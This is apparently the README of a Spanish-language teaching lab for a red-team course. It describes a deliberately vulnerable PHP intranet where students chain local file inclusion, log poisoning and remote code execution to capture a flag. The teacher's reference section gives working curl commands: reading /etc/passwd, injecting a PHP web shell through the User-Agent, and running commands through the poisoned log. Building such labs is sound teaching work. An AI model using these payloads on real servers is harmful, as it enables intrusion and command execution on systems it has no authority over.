# Lab Log Poisoning — LFI → RCE (PHP + Apache)

Laboratorio **educativo** de seguridad web para un curso de equipo rojo. El alumno
explota la cadena clásica **Local File Inclusion → Log Poisoning → Ejecución Remota de
Comandos (RCE)** en una "intranet" deliberadamente vulnerable (PHP + Apache), y obtiene
una **flag única por alumno**.

> **Marco ético.** Entorno autorizado y desechable del curso. La app es ficticia (ACME).
> No uses estas técnicas fuera de este laboratorio.

## La cadena del reto
1. **LFI:** el visor incluye `?page=<archivo>` sin validarlo → se puede leer cualquier archivo.
2. **Log Poisoning:** la intranet registra cada visita con su `User-Agent` sin filtrar en
   `/var/log/lab/<sala>.log`. El alumno envía un `User-Agent` con código PHP.
3. **RCE:** al **incluir el log** por el LFI, el PHP del `User-Agent` se ejecuta; con
   `&cmd=` el alumno ejecuta comandos en el servidor.
4. **Flag:** la flag solo la genera `/usr/local/bin/getflag <sala>`, un binario **ejecutable
   pero no legible** (0711 root). No se puede leer por LFI ni predecir: **hay que lograr RCE**.
   El alumno la ejecuta, copia el `FLAG{...}` y lo valida en el formulario.

Hay una **guía interactiva de 6 etapas** que detecta el progreso real (polling a
`status.php`, leyendo el log de la sala) y enciende cada paso a medida que el alumno lo logra.

## Multi-alumno por "salas"
Una sola instancia sirve a toda la clase. Cada alumno entra con su nombre (login en `/`),
que lo manda a su sala (`?room=<nombre>`). El log a envenenar y la flag son **por sala**,
así que cada alumno hace su propia explotación y obtiene una flag distinta (e impredecible).

---

## Inicio rápido (Codespaces, sin AWS)
El paso a paso con Docker + túnel Cloudflare está en **[`docker cloud.md`](./docker%20cloud.md)**.
Resumen:
```bash
docker compose up -d --build          # levanta la intranet en el puerto 80
cloudflared tunnel --url http://localhost:80   # URL pública temporal para la clase
```
Abre el puerto 80 (o la URL del túnel) → verás el **login** de la intranet.

> **GitHub Pages no sirve**: este lab necesita PHP+Apache en ejecución, no archivos estáticos.

## Rutas
| Ruta | Qué hace |
|------|----------|
| `GET /` | Login; con `?room=` entra a la intranet. |
| `GET /?room=NAME&page=FILE` | Visor que **incluye** `FILE` (el LFI deliberado). |
| `GET /status.php?room=NAME` | Progreso del reto en JSON (lo usa la guía). |
| `GET /check.php?room=NAME&flag=...` | Valida la flag de la sala. |

## Estructura
```
Dockerfile            Imagen PHP+Apache; compila getflag (0711)
docker-compose.yml    Levanta la intranet en el puerto 80
getflag.c             Generador de la flag por sala (secreto no legible)
.devcontainer/        Codespaces: Docker-in-Docker + cloudflared
src/
  index.php           Login + intranet + LFI (?page=) + registro del log por sala
  status.php          Progreso del reto (lee el log; no lo incluye)
  check.php           Validación de la flag
  guide.js            Guía dinámica de 6 etapas (polling)
  assets/style.css    Estilos
  pages/              Páginas benignas de la intranet (home, about)
```

## Prueba de la cadena (referencia del docente)
Con el lab corriendo en `http://localhost` (sala `demo`):
```bash
# 1) LFI
curl -s "http://localhost/?room=demo&page=/etc/passwd" | head
# 2) envenenar el log (User-Agent con PHP)
curl -s -A "<?php system(\$_GET['cmd']); ?>" "http://localhost/?room=demo" >/dev/null
# 3) RCE incluyendo el log
curl -s "http://localhost/?room=demo&page=/var/log/lab/demo.log&cmd=id" | grep uid=
# 4) flag (solo vía ejecución del binario)
curl -s "http://localhost/?room=demo&page=/var/log/lab/demo.log&cmd=getflag%20demo" | grep -o 'FLAG{[^}]*}'
```
